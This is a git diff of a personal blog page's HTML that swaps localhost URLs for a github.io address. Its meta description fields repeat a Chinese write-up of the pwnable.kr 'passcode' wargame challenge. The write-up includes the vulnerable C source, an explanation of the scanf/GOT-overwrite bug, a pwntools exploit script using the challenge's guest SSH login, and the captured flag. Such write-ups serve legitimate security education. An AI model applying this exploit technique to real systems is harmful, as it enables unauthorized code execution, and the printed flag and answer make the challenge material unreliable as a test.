@@ -20,26 +20,26 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="My way, though far away">
 <meta property="og:title" content="Pwnable刷题 5">
-<meta property="og:url" content="http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html">
+<meta property="og:url" content="https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html">
 
 
   <meta property="og:description" content="  刷pwnable。。。题目:passcode - 10 ptMommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that?妈妈告诉我去做一个密码基于本地系统，我的初始化c代码已经编程成功了，没有任何错误，但是，这有一下编译的警告，但是谁在意呢？-_-ssh passcode@pwnable.kr -p2222 (pw:guest)writeup首先还是远程连接了，连接上去看看有什么。三个文件。passcode@ubuntu:~$ lsflag  passcode  passcode.cpasscode@ubuntu:~$ ./passcodeToddler\&#39;s Secure Login System 1.0 beta.enter you name : chenWelcome chen!enter passcode1 : 1Segmentation fault惊了,还没怎么运行就报错了，直接看源代码。#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){    int passcode1;    int passcode2;    printf(&quot;enter passcode1 : &quot;);    scanf(&quot;%d&quot;, passcode1);    fflush(stdin);    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)    printf(&quot;enter passcode2 : &quot;);    scanf(&quot;%d&quot;, passcode2);    printf(&quot;checking...\n&quot;);    if(passcode1==338150 &amp;&amp; passcode2==13371337){            printf(&quot;Login OK!\n&quot;);            system(&quot;/bin/cat flag&quot;);    }    else{            printf(&quot;Login Failed!\n&quot;);            exit(0);    }}void welcome(){    char name[100];    printf(&quot;enter you name : &quot;);    scanf(&quot;%100s&quot;, name);    printf(&quot;Welcome %s!\n&quot;, name);}int main(){    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);    welcome();    login();    // something after login...    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);    return 0;}  首先看main()，输出之后调用welcome函数，再调用login函数，之后打印正确吧。  看welcome()，输入name。没什么东西。  fflush(stdin)是一个计算机专业术语，功能是清空输入缓冲区，通常是为了确保不影响后面的数据读取（例如在读完一个字符串后紧接着又要读取一个字符，此时应该先执行fflush(stdin);）。  login()函数中，先后调用scanf()获取用户输入的两个passcode然后分别与338150和13371337作比较，如果相等的话，便会打印flag。这程序设计的逻辑似乎没啥问题，但是仔细一看，发现这里：printf(&quot;enter passcode1 : &quot;);scanf(&quot;%d&quot;, passcode1);没有加取地址符号&amp;，程序会默认从栈中读取4个字节的数据当做scanf取的地址。漏洞就发生在这里，可以利用GOT覆写技术攻击这个程序。这个的意思就是passcode1使用值传递，原来栈中间是什么值就取这个值，但是scanf会以为是地址，所以会向一个未知地址写值。虽然写入的值还是对的，但是地址未知。意思就是我们可以操控passcode1到任意地址，也就是说scanf是向某个地址写数据。如果我们获得了fflush@plt()的地址，我们可以向got表中写入指令。  将一个GOT表中的函数地址写到栈中，用来充当scanf（）取的地址，然后把system(“/bin/cat flag”)这条指令的地址写到这个GOT表中的函数。当这个函数被调用时，就会直接执行system(“/bin/cat flag”)  现在查看一下GOT表中fflush()的位置，很多方法可以查看elf文件的GOT表，这里说两个常用的命令：readelf -r elfobjdump -R elf  总结，这个漏洞就是先改scanf指向的地址，使其指向got表，然后输入的就是执行函数的地址。可以找到system(“/bin/cat flag”)对应汇编代码开始于0x80485e3（这里有两条指令，第一条将参数”/bin/cat flag”入栈，第二条调用system()）也就是说要把0x80485e3这个值写入fflush()中。#!/usr/bin/pythonfrom pwn import *name_addr=0xffffd078pass1_addr=0xffffd0d8fflush_got = 0x0804a004system_addr = 0x80485e3pwn_ssh=ssh(host=&#39;pwnable.kr&#39;,user=&#39;passcode&#39;,password=&#39;guest&#39;,port=2222)print pwn_ssh.connected()sh=pwn_ssh.process(executable=&quot;./passcode&quot;)print sh.recv()shellcode = &#39;A&#39; *(pass1_addr-name_addr)payload = shellcode + p32(fflush_got) + str(system_addr)sh.sendline(payload)print sh.recvall()flag:Sorry mom.. I got confused about scanf usage :(">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
+  <meta property="og:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
 
 
 
   <meta name="twitter:site" content="@zjgcjy">
   <meta name="twitter:title" content="Pwnable刷题 5">
   <meta name="twitter:description" content="  刷pwnable。。。题目:passcode - 10 ptMommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that?妈妈告诉我去做一个密码基于本地系统，我的初始化c代码已经编程成功了，没有任何错误，但是，这有一下编译的警告，但是谁在意呢？-_-ssh passcode@pwnable.kr -p2222 (pw:guest)writeup首先还是远程连接了，连接上去看看有什么。三个文件。passcode@ubuntu:~$ lsflag  passcode  passcode.cpasscode@ubuntu:~$ ./passcodeToddler\&#39;s Secure Login System 1.0 beta.enter you name : chenWelcome chen!enter passcode1 : 1Segmentation fault惊了,还没怎么运行就报错了，直接看源代码。#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){    int passcode1;    int passcode2;    printf(&quot;enter passcode1 : &quot;);    scanf(&quot;%d&quot;, passcode1);    fflush(stdin);    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)    printf(&quot;enter passcode2 : &quot;);    scanf(&quot;%d&quot;, passcode2);    printf(&quot;checking...\n&quot;);    if(passcode1==338150 &amp;&amp; passcode2==13371337){            printf(&quot;Login OK!\n&quot;);            system(&quot;/bin/cat flag&quot;);    }    else{            printf(&quot;Login Failed!\n&quot;);            exit(0);    }}void welcome(){    char name[100];    printf(&quot;enter you name : &quot;);    scanf(&quot;%100s&quot;, name);    printf(&quot;Welcome %s!\n&quot;, name);}int main(){    printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);    welcome();    login();    // something after login...    printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);    return 0;}  首先看main()，输出之后调用welcome函数，再调用login函数，之后打印正确吧。  看welcome()，输入name。没什么东西。  fflush(stdin)是一个计算机专业术语，功能是清空输入缓冲区，通常是为了确保不影响后面的数据读取（例如在读完一个字符串后紧接着又要读取一个字符，此时应该先执行fflush(stdin);）。  login()函数中，先后调用scanf()获取用户输入的两个passcode然后分别与338150和13371337作比较，如果相等的话，便会打印flag。这程序设计的逻辑似乎没啥问题，但是仔细一看，发现这里：printf(&quot;enter passcode1 : &quot;);scanf(&quot;%d&quot;, passcode1);没有加取地址符号&amp;，程序会默认从栈中读取4个字节的数据当做scanf取的地址。漏洞就发生在这里，可以利用GOT覆写技术攻击这个程序。这个的意思就是passcode1使用值传递，原来栈中间是什么值就取这个值，但是scanf会以为是地址，所以会向一个未知地址写值。虽然写入的值还是对的，但是地址未知。意思就是我们可以操控passcode1到任意地址，也就是说scanf是向某个地址写数据。如果我们获得了fflush@plt()的地址，我们可以向got表中写入指令。  将一个GOT表中的函数地址写到栈中，用来充当scanf（）取的地址，然后把system(“/bin/cat flag”)这条指令的地址写到这个GOT表中的函数。当这个函数被调用时，就会直接执行system(“/bin/cat flag”)  现在查看一下GOT表中fflush()的位置，很多方法可以查看elf文件的GOT表，这里说两个常用的命令：readelf -r elfobjdump -R elf  总结，这个漏洞就是先改scanf指向的地址，使其指向got表，然后输入的就是执行函数的地址。可以找到system(“/bin/cat flag”)对应汇编代码开始于0x80485e3（这里有两条指令，第一条将参数”/bin/cat flag”入栈，第二条调用system()）也就是说要把0x80485e3这个值写入fflush()中。#!/usr/bin/pythonfrom pwn import *name_addr=0xffffd078pass1_addr=0xffffd0d8fflush_got = 0x0804a004system_addr = 0x80485e3pwn_ssh=ssh(host=&#39;pwnable.kr&#39;,user=&#39;passcode&#39;,password=&#39;guest&#39;,port=2222)print pwn_ssh.connected()sh=pwn_ssh.process(executable=&quot;./passcode&quot;)print sh.recv()shellcode = &#39;A&#39; *(pass1_addr-name_addr)payload = shellcode + p32(fflush_got) + str(system_addr)sh.sendline(payload)print sh.recvall()flag:Sorry mom.. I got confused about scanf usage :(">
-  <meta name="twitter:url" content="http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html">
+  <meta name="twitter:url" content="https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html">
 
   
     <meta name="twitter:card" content="summary">
     
-      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
+      <meta name="twitter:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
     
   
 
@@ -58,7 +58,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html">
+<link rel="canonical" href="https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html">
 
 
 
@@ -69,7 +69,7 @@
     
       "@type": "Person",
       "name": "Blogger",
-      "url": "http://localhost:4000/",
+      "url": "https://zjgcjy.github.io/",
       "sameAs": ["https://twitter.com/","https://github.com/"]
     
   }
@@ -193,7 +193,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="https://zjgcjy.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -551,11 +551,11 @@ objdump -R elf</li>
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnable%E5%88%B7%E9%A2%98+5%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-5.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fa fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnable%E5%88%B7%E9%A2%98+5%20https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-5.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fa fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-5.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fa fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-5.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fa fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-5.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-5.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -816,7 +816,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.url = "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-5.html";  // Replace PAGE_URL with your page's canonical URL variable
       this.page.identifier = "/posts/2017-08/pwnable刷题-5"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     (function() { // DON'T EDIT BELOW THIS LINE
